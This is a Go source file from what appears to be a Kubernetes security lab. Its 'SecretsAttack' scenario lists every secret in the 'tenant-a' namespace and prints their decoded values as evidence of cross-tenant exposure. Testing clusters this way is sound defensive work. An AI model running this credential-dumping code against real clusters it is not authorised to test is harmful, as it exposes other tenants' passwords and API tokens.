package scenarios

import (
	"context"
	"fmt"

	"k8s-security-lab/internal/cluster"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func SecretsAttack() error {

	fmt.Println("[*] Starting Kubernetes secrets extraction scenario")

	client, err := cluster.GetClient()
	if err != nil {
		return err
	}

	namespace := "tenant-a"

	fmt.Println("[*] Target namespace:", namespace)

	fmt.Println("[*] Attempting to list secrets")

	secrets, err := client.CoreV1().
		Secrets(namespace).
		List(context.Background(), metav1.ListOptions{})

	if err != nil {

		fmt.Println("[!] Access denied")

		fmt.Println("\nEvidence:")
		fmt.Println(err)

		return err
	}

	if len(secrets.Items) == 0 {

		fmt.Println("[!] No secrets found in namespace")

		return nil
	}

	fmt.Println("[+] Secrets accessible")

	fmt.Println("\nEvidence:")

	for _, secret := range secrets.Items {

		fmt.Printf("\nSecret: %s\n", secret.Name)

		for key, value := range secret.Data {

			fmt.Printf("  %s: %s\n", key, string(value))
		}
	}

	fmt.Println("\nImpact:")

	fmt.Println("- Sensitive credentials exposed")
	fmt.Println("- Possible database passwords")
	fmt.Println("- Possible API tokens")

	return nil
}
